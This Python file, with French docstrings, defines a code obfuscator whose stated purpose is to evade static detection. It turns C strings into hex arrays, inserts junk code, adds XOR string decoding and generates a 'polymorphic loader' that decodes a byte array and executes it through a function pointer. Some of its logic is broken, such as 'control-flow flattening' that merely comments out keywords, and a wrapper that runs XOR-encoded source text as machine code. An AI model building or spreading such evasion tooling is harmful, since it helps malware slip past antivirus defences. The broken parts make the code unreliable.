#!/usr/bin/env python3
"""
Code Obfuscation Techniques
- String obfuscation
- Control flow obfuscation
- Junk code insertion
- Polymorphic code generation
"""

import random
import string
import base64
from typing import List, Optional

class CodeObfuscator:
    """
    Obfuscation de code pour éviter la détection statique
    """
    
    @staticmethod
    def obfuscate_strings(code: str) -> str:
        """
        Obfusque les strings dans le code C
        """
        lines = code.split('\n')
        obfuscated = []
        
        for line in lines:
            if '"' in line and 'printf' not in line:
                # Remplacer les strings par des char arrays
                parts = line.split('"')
                if len(parts) >= 2:
                    string_content = parts[1]
                    # Convertir en tableau de chars
                    char_array = '{' + ','.join(f"0x{ord(c):02x}" for c in string_content) + ',0}'
                    line = line.replace(f'"{string_content}"', char_array)
            obfuscated.append(line)
        
        return '\n'.join(obfuscated)
    
    @staticmethod
    def add_junk_code(code: str, junk_percent: int = 20) -> str:
        """
        Ajoute du code inutile pour gonfler la taille
        """
        junk_templates = [
            'int junk_{} = {};',
            'volatile int junk_{} = {} + {};',
            'if (junk_{} == {}) {{}}',
            'for(int i_{}=0; i_{}<{}; i_{}++) {{}}',
            'while(junk_{} < {}) {{ junk_{}++; }}'
        ]
        
        lines = code.split('\n')
        result = []
        
        for i, line in enumerate(lines):
            result.append(line)
            if random.randint(1, 100) <= junk_percent:
                # Ajouter du junk code
                junk_id = random.randint(1000, 9999)
                template = random.choice(junk_templates)
                if '{}' in template:
                    junk_line = template.format(
                        junk_id,
                        random.randint(1, 100),
                        random.randint(1, 50)
                    )
                    result.append('    ' + junk_line)
        
        return '\n'.join(result)
    
    @staticmethod
    def flatten_control_flow(code: str) -> str:
        """
        Transforme le control flow en switch/case
        """
        # Version simplifiée
        return code.replace('if', '// obfuscated if').replace('for', '// obfuscated for')
    
    @staticmethod
    def xor_encode_strings(code: str, key: int = 0xAA) -> str:
        """
        Encode les strings avec XOR et ajoute decode function
        """
        xor_function = f'''
// XOR decode function
void xor_decode(char* str, int len, char key) {{
    for(int i=0; i<len; i++) {{
        str[i] ^= key;
    }}
}}

// XOR key
char xor_key = {key};

'''
        return xor_function + code
    
    @staticmethod
    def generate_polymorphic_wrapper(original_code: str) -> str:
        """
        Génère un wrapper polymorphe qui change à chaque génération
        """
        # Générer une clé XOR aléatoire
        xor_key = random.randint(1, 255)
        
        # Encoder le code original
        encoded = bytes([ord(c) ^ xor_key for c in original_code])
        b64_encoded = base64.b64encode(encoded).decode()
        
        wrapper = f'''#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Polymorphic loader - Generated at {__import__('time').time()}
unsigned char encoded_code[] = {{{', '.join(f'0x{b:02x}' for b in base64.b64decode(b64_encoded))}}};
int code_len = sizeof(encoded_code);
unsigned char xor_key = {xor_key};

void decode_and_exec() {{
    for(int i=0; i<code_len; i++) {{
        encoded_code[i] ^= xor_key;
    }}
    
    // Execute decoded code
    ((void(*)())encoded_code)();
}}

int main() {{
    decode_and_exec();
    return 0;
}}
'''
        return wrapper